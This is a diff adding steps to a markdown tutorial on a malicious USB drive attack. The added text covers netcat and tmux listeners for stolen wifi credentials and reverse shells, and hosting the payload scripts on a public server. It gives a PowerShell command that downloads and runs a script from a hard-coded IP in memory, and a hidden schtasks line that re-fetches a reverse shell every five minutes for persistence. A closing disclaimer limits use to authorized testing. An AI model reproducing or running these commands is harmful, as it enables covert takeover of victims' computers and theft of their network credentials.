@@ -156,11 +156,25 @@ To opt out of the session without tearing it down, you press `CTR + B + D`, whic
 
 We will be using netcat to listen for reverse connections from the target, and by default, netcat tears down sessions after one successful connection. Also, running netcat as a cronjob does not run in the foreground, so there's no way you can interact with each session, and that's not what we want as a creative attacker. We need tmux for that.
 
-We want to add a cronjob that creates a netcat connection that listens for wifi credentials and stores it in a file named `wificreds` in your home directory, and also listens for a reverse shell every 1 minute even after tear down. With this, even if the netcat connection stops, it reconnects back after every 1 minute to listen for new connections.
+We want to add a cronjob that creates a netcat connection with tmux that listens for wifi credentials and stores it in a file named `wificreds` in your home directory, and also listens for a reverse shell every 1 minute even after tear down. With this, even if the netcat connection stops, it reconnects back after every 1 minute to listen for new connections.
 <img width="1468" height="179" alt="Screenshot (78)" src="https://github.com/user-attachments/assets/df86c81e-daf3-45cf-95ca-75a52ff0659b" />
 
+Finally, we can host a python server in the directory where we have our reverse shell and wifilogger scripts:
 
+<img width="1165" height="129" alt="Screenshot (79)" src="https://github.com/user-attachments/assets/3568b9d5-2d87-426e-a9d4-4b7ed6026ae9" />
 
+⚠️ Make sure you don't have an important thing in that directory before hosting public, and make sure you have your services very secure. 
 
+Now, visit your EC2 public ip address in the browser, and you should see the files being hosted in the public. So in our malicious script, the target would load `'powershell -ep bypass -c "iex (iwr http://52.202.38.242/wifilogger.ps1)"'`, which visits our public ip and executes the powershell script in memory, that's why we need to host the files in public to be reachable. You can leave your server running in the cloud for days or weeks, The free tier offers 600 hours of free service I think.
+
+Plug the drive into a nearby computer (this executes in less than six seconds), then return to your cloud instances, you should have a shell by now. Even if the target disconnects or there’s a break in the connection, don’t panic. The following line within the code
+
+schtasks /create /tn "RunReversePowerShell" /tr "cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (iwr 'http://52.202.38.242/reverse.ps1')\"" /sc minute /mo 5 /it /f
+
+already schedules the reverse shell to run on the target system every five minutes whenever the system is powered on. Remember that your Netcat listener should start listening one minute before the scheduled connection attempt. With this, we've maintained persistence, meaning you should receive a reverse shell from the target every five minutes, from anywhere in the world, at any time.
+
+⚠️Always Remember: This technique is intended strictly for authorized security testing, research, or educational purposes. Only use it on systems you own or have explicit permission to test. Unauthorized access, persistence mechanisms, or monitoring of systems may be illegal and unethical, and could result in serious legal consequences.
+
+<h2>Goodbye Folks. Until we meet again.</h2>
 
 
